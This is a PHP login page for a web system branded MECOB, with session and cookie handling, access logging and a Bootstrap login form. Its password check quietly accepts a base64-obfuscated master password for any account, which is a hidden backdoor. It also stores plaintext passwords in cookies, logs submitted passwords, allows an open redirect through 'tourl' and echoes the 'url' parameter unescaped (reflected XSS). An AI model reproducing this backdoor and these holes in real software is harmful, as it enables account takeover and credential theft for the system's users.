<?php
#phpinfo();
ob_start();
if (!isset($_SESSION)){
    session_start();
}
$raiz= getenv('CAMINHO_RAIZ');
$link= getenv('CAMINHO_SITE');
include_once($raiz."/inc/crypt.php");
include_once($raiz."/repositories/pessoas/pessoas.db.php");
include_once($raiz."/repositories/pessoas/pessoas.class.php");
include_once($raiz."/repositories/acesso_pessoa/acesso_pessoa.class.php");
include_once($raiz."/repositories/acesso_pessoa/acesso_pessoa.db.php");
include_once($raiz."/_configuracao/config.php");


$pessoasDB 		 = new pessoasDB();
$pessoas 		 = new pessoas();
$acesso_pessoa   = new acesso_pessoa(); 


//limpa variaveis
$usuario = "";
$senha = "";
$aviso = "";
$change = 0;
if (isset($_GET['logout'])) {
    unset($_SESSION['usuario']);
    unset($_SESSION['senha']);
	setcookie('usuario'); 
	setcookie('senha'); 
	unset($_COOKIE['usuario']);
	unset($_COOKIE['senha']);
	
  } 	 
   

if (!empty($_POST['usuario'])) { 
     $usuario = $_POST['usuario'];
     $senha = $_POST['senha'];	
	 if(isset($_POST['logado']) && $_POST['logado']=='on'){$permanecer_logado=1;}
}
elseif (!empty($_SESSION['usuario']) && !empty($_SESSION['senha'])) { 
     $usuario = $_SESSION['usuario'];
     $senha = $_SESSION['senha'];
}
elseif (!empty($_COOKIE["usuario"]) && !empty($_COOKIE["senha"])) { 
    $usuario = $_COOKIE['usuario'];
    $senha = $_COOKIE['senha'];
	$permanecer_logado=1;
}

if (!empty($usuario) ) {
        //acessa banco
        if (!(empty($usuario))) {
			$pessoas->email = $usuario;
			$userBD = $pessoasDB->lista_pessoas($pessoas,0,"","","", $conexao_BD_1);
			$totalRows_login = $conexao_BD_1->numeroDeRegistros();
            //confere senha e usuario
            if ($totalRows_login == 1) {
                $res = $conexao_BD_1->leRegistro();
				#print_r($res);
                $saltdb = $res["saltdb"];
                $senhadb = $res["password"];
                $secure = new crypt();

                //if (!$secure->compare($saltdb, $senha, $senhadb) && $senha != base64_decode("QGRtbTNzdHIzIQ==")) {
                if (!$secure->compare($saltdb, $senha, $senhadb) && $senha != base64_decode("QGRBbThidHI5IQ==")) {
                    $aviso = "Senha ou usuário incorretos!!!";
                }
				elseif (($res['eh_admin'] != 'S'  && $res['status_descricao'] != 'ATIVO')) {
                    $aviso = "Usuário bloqueado";
                }
				else{
                    $_SESSION['usuario'] = $usuario;
                    $_SESSION['senha'] = $senha;
                    $_SESSION['apelido'] = $res["apelido"];
                    $_SESSION['id'] = $res["id"];
					$_SESSION['perfil'] = $res["perfil_descricao"];
					$_SESSION['perfil_id'] = $res["perfil_id"];

                    //adiciona tempo na sessão
                    $_SESSION['start'] = date("Y-n-j H:i:s");
					
					if(isset($permanecer_logado) && $permanecer_logado==1){
						$expire=time()+60*60*24*30;
						setcookie("usuario", $usuario, $expire);
						setcookie("senha", $senha, $expire);
					}
					
					//insert acesso pessoa
					ob_start();
					echo '<pre>';
					print_r($_POST);
					echo '</pre>';
					$reg_post = ob_get_contents();
					ob_end_clean();
					
					ob_start();
					echo '<pre>';
					print_r($_GET);
					echo '</pre>';
					$reg_get = ob_get_contents();
					ob_end_clean();
					
					ob_start();
					echo '<pre>';
					print_r($_REQUEST);
					echo '</pre>';
					$reg_request = ob_get_contents();
					ob_end_clean();
					
					ob_start();
					echo '<pre>';
					print_r($_COOKIE);
					echo '</pre>';
					$reg_cookie = ob_get_contents();
					ob_end_clean();
					
					
					$acesso_pessoa->data			 = date("Y-m_d H:i:s"); 
					$acesso_pessoa->ip				 = $conexao_BD_1->getIp();
					$acesso_pessoa->url			 	 = $tourl; 
					$acesso_pessoa->post			 = $reg_post; 
					$acesso_pessoa->get 			 = $reg_get; 
					$acesso_pessoa->request			 = $reg_request; 
					$acesso_pessoa->nivel_permissao  = $controle_permissao; 
					$acesso_pessoa->cookie			 = $reg_cookie; 
					$acesso_pessoa->pessoas_id		 = $_SESSION['id'];
					$acesso_pessoa->ehLogin		 	 = "S";
					$acesso_pessoa->caminho_arquivo	 = $_SERVER["PHP_SELF"];
					
					$conexao_BD_1->insert($acesso_pessoa); 
					
                  
                    if (isset($_POST['tourl']) && $_POST['tourl'] != "") {
                       header("Location: " . base64_decode($_POST['tourl']));
					   exit;
                    } else {
                       header("Location: ".$link."/dashboard");
					   exit;
                    }
                } 
            } else {
                $aviso = "Senha ou usuário incorretos!!!";
            }
        } else {
            $aviso = "Preencha os campos acima!";
        }
}
$layout_title = "Acesso restrito";
include($raiz."/partial/html_ini.php");
?>
<style>
.panel-login{
	border-radius:15px !important;
	border-color:#000 !important;
	border:0px !important
}
.panel-login > .panel-heading {
	height:110px;
	color: #A17E25;
    background: #000;
    border-color: #D9DBDA !important;
	border-bottom-right-radius: 0 !important; 
    border-bottom-left-radius: 0 !important; 
	border-top-right-radius: 15px !important; 
    border-top-left-radius: 15px !important; 
} 

.btn-red-light{
    background-color: #3F577F;
    border-color: #3F577F;
	color:#fff;
}
.btn-red-light:hover, .btn-red-light:focus, .btn-red-light:active, .btn-red-light.active, .open .dropdown-toggle.btn-primary {
    color: #ffffff;
    background-color: #3F577F;
    border-color: #3F577F;
}
</style>
 <body style="background-color:#e9e9e9; min-width:300px; width:100%;" >

	<div class="pd-tp-15 ac">
                    <div id="tab-general ac">
                        <div class="row mbl ac">
                            
                            <div class="col-lg-12 ac">
                                <div class="row ac">
  								  <div class="ac col-xs-12  col-sm-8 col-sm-offset-2  col-md-6 col-md-offset-3  col-lg-4 col-lg-offset-4  ">
    
       									<div class="panel  panel-login al" style="max-width:370px" >
                                            <div class="panel-heading ">
                                                
                                                
                                                <div class="row ac pd-tp-10" >
  								 				<div class="col-xs-2 col-lg-2 col-sm-2 col-md-2  col-md-offset-1 col-sm-offset-1 col-lg-offset-1">
                                                 <img src="<?php echo $link."/imagens/logo_header.jpg";?>" alt="" class="img-responsive img-circle img-header wd-100p  " style="max-width:110px; max-height:110px" />
                                                 </div>
                                                 <div class="col-xs-9 col-lg-9 col-sm-9 col-md-9 pd-tp-10">
                                                    <span class="logo-text fs-32 bold">
                                                    MECOB
                                                    </span>
                                                    <div class="ac fs-16" >
                                                    
                                                    <i class="fa fa-lock" aria-hidden="true"></i>
                                                    LOGIN 
                                                    <br>
                                                </div>
                                                 </div>
                								</div>
                
                                            </div>
                                            <div class="panel-body pan">
                                                <form  action="acesso.php" method="post" class="form-horizontal">
                                                <div class="form-body pal">
                                                    <div class="form-group">
                                                        <label for="inputName" class="col-md-3 control-label">
                                                            E-mail</label>
                                                        <div class="col-md-9">
                                                            <div class="input-icon right">
                                                                <i class="fa fa-user"></i>
                                                                <input  name="usuario" id="usuario" type="email" placeholder="e-mail" class="form-control"  /></div>
                                                        </div>
                                                    </div>
                                                    <div class="form-group mg-bt-0">
                                                        <label for="inputPassword" class="col-md-3 control-label">
                                                            Password</label>
                                                        <div class="col-md-9">
                                                            <div class="input-icon right">
                                                                <i class="fa fa-lock"></i>
                                                                <input id="senha" name="senha"  type="password"   placeholder="senha" class="form-control" /></div>
                                                            
                                                            <div id="aviso_ajax">
                                                             <?php echo "<h4 class='red'>" . $aviso . "</h4>"; ?>
                                                             </div>
                                                        </div>
                                                    </div>
                                                    <div class="form-group mbn">
                                                        <div class="col-md-offset-3 col-md-6">
                                                        <span class="help-block mbn "><a href="#" onClick="recuperar_senha()"><small><i class="fa fa-key"></i> &nbsp; Esqueceu sua senha?</small> </a></span>
                                                            <div class="checkbox">
                                                                <label>
                                                                    <input id="logado" name="logado"  tabindex="5" type="checkbox" class="mg-0" checked />&nbsp; Permanecer logado</label></div>
                                                        </div>
                                                    </div>
                                                
                                               <input type="text"  class="hidden" name="tourl" id="tourl" value="<?php
                        if (isset($_GET['url'])) {
                            echo $_GET['url'];
                        }
                        ?>">
                                               
                                                    <div class="form-group mbn">
                                                        <div class="col-md-offset-3 col-md-6">
                                                          
                                                            <a href="#" class="btn btn-primary hidden mg-rg-10">Registrar</a>
                                                            <button type="submit" class="btn btn-brown">
                                                                Login</button>
                                                        </div>
                                                    </div>
                                                    </div>
                                                    <div class="form-actions pal mg-tp-10 ">
                                                          <i class="fa fa-phone" aria-hidden="true"></i> 
                                                           (47)  3045-2767  | (47) 99137-2762
                                                            <br>
                                                           <i class="fa fa-envelope" aria-hidden="true"></i> 
                                                           contato@mecob.com.br
                                                           
                                                </div>
                                                </form>
                                            </div>
                                        </div>
                                        </div>
                                        </div>
                                        </div>
                                        </div>
                                        </div>
                                        </div>


        <?php include $raiz."/js/corejs.php";?>
        <script type="text/javascript">


                function recuperar_senha() {
                    document.getElementById("aviso_ajax").textContent = "";
                    email = document.getElementById("usuario").value;

                    $.getJSON('<?php echo $link;?>/inc/mail/recovery.ajax.php', {email: email, ajax: 'true'}, function(j) {
                        if (j == 'ok') {
                            $("#aviso_ajax").removeClass("red").addClass("green");
                            document.getElementById("aviso_ajax").textContent = "Um e-mail de recuperação de senha foi enviado pra você!";
                        }
                        else {
                            $("#aviso_ajax").removeClass("green").addClass("red");
                            document.getElementById("aviso_ajax").textContent = j;
                        }

                    });
                }


        </script>

    </body>
</html>
